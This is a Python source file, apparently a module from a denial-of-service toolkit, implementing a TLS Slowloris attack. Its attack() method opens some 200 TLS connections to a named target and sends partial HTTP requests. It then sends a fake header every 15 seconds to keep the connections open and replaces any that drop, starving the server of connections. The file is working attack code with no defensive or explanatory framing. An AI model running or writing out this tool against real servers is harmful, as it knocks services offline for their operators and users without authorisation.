import ssl
import socket
import threading
import time
import random
from utils.logger import logger
from config.settings import config

class TLSSlowloris:
    def __init__(self):
        self.running = False
        self.sockets = []

    def attack(self, target, port=443, sockets_count=200, headers_interval=15, timeout=300):
        self.running = True
        logger.info(f"Starting TLS Slowloris on {target}:{port}")

        def create_socket():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                tls_sock = ctx.wrap_socket(sock, server_hostname=target)
                tls_sock.connect((target, port))
                tls_sock.send(b"GET /?%d HTTP/1.1\r\n" % random.randint(0, 2000))
                tls_sock.send(b"Host: %s\r\n" % target.encode())
                tls_sock.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n")
                return tls_sock
            except:
                return None

        for _ in range(sockets_count):
            sock = create_socket()
            if sock:
                self.sockets.append(sock)

        def keep_alive():
            while self.running:
                for i, sock in enumerate(self.sockets):
                    try:
                        sock.send(b"X-a: %d\r\n" % random.randint(0, 5000))
                    except:
                        self.sockets[i] = create_socket()
                time.sleep(headers_interval)

        threading.Thread(target=keep_alive, daemon=True).start()
        time.sleep(timeout)
        self.running = False

    def stop(self):
        self.running = False
        for s in self.sockets:
            try:
                s.close()
            except:
                pass